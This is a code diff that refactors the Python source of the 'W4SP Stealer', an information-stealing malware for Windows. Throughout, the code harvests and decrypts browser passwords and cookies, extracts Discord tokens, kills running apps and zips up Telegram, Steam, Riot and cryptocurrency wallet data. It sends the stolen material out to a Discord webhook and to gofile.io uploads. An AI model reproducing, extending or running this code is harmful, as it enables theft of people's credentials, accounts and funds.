@@ -1,8 +1,21 @@
-import os;import threading;from sys import executable;from sqlite3 import connect as sql_connect;import re;from base64 import b64decode;from json import loads as json_loads;from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer;from urllib.request import Request, urlopen;from json import loads, dumps;import time;import shutil;from zipfile import ZipFile;import random;import re;from subprocess import Popen
+from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
+from json import dumps, loads, loads as json_loads
+from urllib.request import Request, urlopen
+from sqlite3 import connect as sql_connect
+from Crypto.Cipher import AES
+from subprocess import Popen
+from base64 import b64decode
+from zipfile import ZipFile
+from random import choice
+import threading
+import requests
+import shutil
+import time
+import os
+import re
 
 webhook = "here"
 DETECTED = False
-C0S19A = Popen
 
 def getip():
     P2X = "None"
@@ -11,18 +24,6 @@ def getip():
     except:
         pass
     return P2X
-
-S4A = [["requests", "requests"], ["Crypto.Cipher", "pycryptodome"]]
-
-
-for x0o in S4A:
-    try: __import__(x0o[0])
-    except:
-        C0S19A(f"{executable} -m pip install {x0o[1]}", shell=True)
-        time.sleep(3)
-
-import requests
-from Crypto.Cipher import AES
 
 local = os.getenv('LOCALAPPDATA')
 roaming = os.getenv('APPDATA')
@@ -64,8 +65,8 @@ def DecryptValue(buff, master_key=None):
         decrypted_pass = decrypted_pass[:-16].decode()
         return decrypted_pass
 
-def LoadRequests(methode, url, data='', files='', headers=''):
-    for i in range(8): # max trys
+def LoadRequests(methode, url, data='', files=''):
+    for _ in range(8): 
         try:
             if methode == 'POST':
                 if data != '':
@@ -79,8 +80,8 @@ def LoadRequests(methode, url, data='', files='', headers=''):
         except:
             pass
 
-def LoadUrlib(webhook, data='', files='', headers=''):
-    for i in range(8):
+def LoadUrlib(webhook, data='', headers=''):
+    for _ in range(8):
         try:
             if headers != '':
                 r = urlopen(Request(webhook, data=data, headers=headers))
@@ -95,22 +96,17 @@ def globalInfo():
     P2X = getip()
     username = os.getenv("USERNAME")
     ipdatanojson = urlopen(Request(f"https://geolocation-db.com/jsonp/{P2X}")).read().decode().replace('callback(', '').replace('})', '}')
-    # print(ipdatanojson)
     ipdata = loads(ipdatanojson)
-    # print(urlopen(Request(f"https://geolocation-db.com/jsonp/{P2X}")).read().decode())
     contry = ipdata["country_name"]
     contryCode = ipdata["country_code"].lower()
     globalinfo = f":flag_{contryCode}:  - `{username.upper()} | {P2X} ({contry})`"
-    # print(globalinfo)
     return globalinfo
 
 
 def Trust(Cookies):
-    # simple Trust Factor system
     global DETECTED
     data = str(Cookies)
     tim = re.findall(".google.com", data)
-    # print(len(tim))
     if len(tim) < -1:
         DETECTED = True
         return DETECTED
@@ -299,7 +295,6 @@ def uploadToken(token, path):
         "username": "W4SP Stealer",
         "attachments": []
         }
-    # urlopen(Request(webhook, data=dumps(data).encode(), headers=headers))
     LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
 
 def Reformat(listt):
@@ -394,17 +389,6 @@ def upload(name, link):
         LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
         return
 
-
-
-# def upload(name, tk=''):
-#     headers = {
-#         "Content-Type": "application/json",
-#         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
-#     }
-
-#     # r = requests.post(webhook, files=files)
-#     LoadRequests("POST", webhook, files=files)
-
 def writeforfile(data, name):
     path = os.getenv("TEMP") + f"\wp{name}.txt"
     with open(path, mode='w', encoding='utf-8') as f:
@@ -438,7 +422,7 @@ def getPassw(path, arg):
     pathC = path + arg + "/Login Data"
     if os.stat(pathC).st_size == 0: return
 
-    tempfold = temp + "wp" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
+    tempfold = temp + "wp" + ''.join(choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
 
     shutil.copy2(pathC, tempfold)
     conn = sql_connect(tempfold)
@@ -475,7 +459,7 @@ def getCookie(path, arg):
     pathC = path + arg + "/Cookies"
     if os.stat(pathC).st_size == 0: return
     
-    tempfold = temp + "wp" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
+    tempfold = temp + "wp" + ''.join(choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
     
     shutil.copy2(pathC, tempfold)
     conn = sql_connect(tempfold)
@@ -527,7 +511,6 @@ def GetDiscord(path, arg):
                         if not tokenDecoded in Tokens:
                             # print(token)
                             Tokens += tokenDecoded
-                            # writeforfile(Tokens, 'tokens')
                             uploadToken(tokenDecoded, path)
 
 def GatherZips(paths1, paths2, paths3):
@@ -549,7 +532,6 @@ def GatherZips(paths1, paths2, paths3):
     for thread in thttht: 
         thread.join()
     global WalletsZip, GamingZip, OtherZip
-        # print(WalletsZip, GamingZip, OtherZip)
 
     wal, ga, ot = "",'',''
     if not len(WalletsZip) == 0:
@@ -594,7 +576,7 @@ def ZipTelegram(path, arg, procc):
     pathC = path
     name = arg
     if not os.path.exists(pathC): return
-    C0S19A(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)
+    Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)
 
     zf = ZipFile(f"{pathC}/{name}.zip", "w")
     for file in os.listdir(pathC):
@@ -602,7 +584,6 @@ def ZipTelegram(path, arg, procc):
             zf.write(pathC + "/" + file)
     zf.close()
 
-    # lnik = uploadToAnonfiles(f'{pathC}/{name}.zip')
     lnik = "https://google.com"
     os.remove(f"{pathC}/{name}.zip")
     OtherZip.append([arg, lnik])
@@ -611,8 +592,6 @@ def ZipThings(path, arg, procc):
     pathC = path
     name = arg
     global WalletsZip, GamingZip, OtherZip
-    # C0S19A(f"taskkill /im {procc} /t /f", shell=True)
-    # os.system(f"taskkill /im {procc} /t /f")
 
     if "nkbihfbeogaeaoehlefnkodbefgpgknn" in arg:
         browser = path.split("\\")[4].split("/")[1].replace(' ', '')
@@ -620,7 +599,7 @@ def ZipThings(path, arg, procc):
         pathC = path + arg
     
     if not os.path.exists(pathC): return
-    C0S19A(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)
+    Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)
 
     if "Wallet" in arg or "NationsGlory" in arg:
         browser = path.split("\\")[4].split("/")[1].replace(' ', '')
@@ -630,7 +609,6 @@ def ZipThings(path, arg, procc):
         if not os.path.isfile(f"{pathC}/loginusers.vdf"): return
         f = open(f"{pathC}/loginusers.vdf", "r+", encoding="utf8")
         data = f.readlines()
-        # print(data)
         found = False
         for l in data:
             if 'RememberPassword"\t\t"1"' in l:
@@ -657,11 +635,8 @@ def ZipThings(path, arg, procc):
 
 
 def GatherAll():
-    '                   Default Path < 0 >                         ProcesName < 1 >        Token  < 2 >              Password < 3 >     Cookies < 4 >                          Extentions < 5 >                                  '
     browserPaths = [[f"{roaming}/Opera Software/Opera GX Stable",               "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ], [f"{roaming}/Opera Software/Opera Stable",                  "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ], [f"{roaming}/Opera Software/Opera Neon/User Data/Default",  "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ], [f"{local}/Google/Chrome/User Data",                        "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ], [f"{local}/Google/Chrome SxS/User Data",                    "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ], [f"{local}/BraveSoftware/Brave-Browser/User Data",          "brave.exe",    "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ], [f"{local}/Yandex/YandexBrowser/User Data",                 "yandex.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn"                                    ], [f"{local}/Microsoft/Edge/User Data",                       "edge.exe",     "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ]]
-
     discordPaths = [[f"{roaming}/Discord", "/Local Storage/leveldb"], [f"{roaming}/Lightcord", "/Local Storage/leveldb"], [f"{roaming}/discordcanary", "/Local Storage/leveldb"], [f"{roaming}/discordptb", "/Local Storage/leveldb"]]
-
     PathsToZip = [[f"{roaming}/atomic/Local Storage/leveldb", '"Atomic Wallet.exe"', "Wallet"], [f"{roaming}/Exodus/exodus.wallet", "Exodus.exe", "Wallet"], ["C:\Program Files (x86)\Steam\config", "steam.exe", "Steam"], [f"{roaming}/NationsGlory/Local Storage/leveldb", "NationsGlory.exe", "NationsGlory"], [f"{local}/Riot Games/Riot Client/Data", "RiotClientServices.exe", "RiotClient"]]
     Telegram = [f"{roaming}/Telegram Desktop/tdata", 'telegram.exe', "Telegram"]
 
@@ -692,37 +667,19 @@ def GatherAll():
     DETECTED = Trust(Cookies)
     if DETECTED == True: return
 
-    # for patt in browserPaths:
-    #     threading.Thread(target=ZipThings, args=[patt[0], patt[5], patt[1]]).start()
-    
-    # for patt in PathsToZip:
-    #     threading.Thread(target=ZipThings, args=[patt[0], patt[2], patt[1]]).start()
-    
-    # threading.Thread(target=ZipTelegram, args=[Telegram[0], Telegram[2], Telegram[1]]).start()
-
     for thread in Threadlist: 
         thread.join()
     global upths
     upths = []
 
     for file in ["wppassw.txt", "wpcook.txt"]: 
-        # upload(os.getenv("TEMP") + "\\" + file)
         upload(file.replace(".txt", ""), uploadToAnonfiles(os.getenv("TEMP") + "\\" + file))
 
 def uploadToAnonfiles(path):
     try:return requests.post(f'https://{requests.get("https://api.gofile.io/getServer").json()["data"]["server"]}.gofile.io/uploadFile', files={'file': open(path, 'rb')}).json()["data"]["downloadPage"]
     except:return False
 
-# def uploadToAnonfiles(path):s
-#     try:
-#         files = { "file": (path, open(path, mode='rb')) }
-#         upload = requests.post("https://transfer.sh/", files=files)
-#         url = upload.text
-#         return url
-#     except:
-#         return False
-
-def KiwiFolder(pathF, keywords):
+def KiwiFolder(pathF):
     global KiwiFiles
     maxfilesperdir = 7
     i = 0
@@ -790,7 +747,6 @@ OtherZip = []
 
 GatherAll()
 DETECTED = Trust(Cookies)
-# DETECTED = False
 if not DETECTED:
     wikith = Kiwi()
 
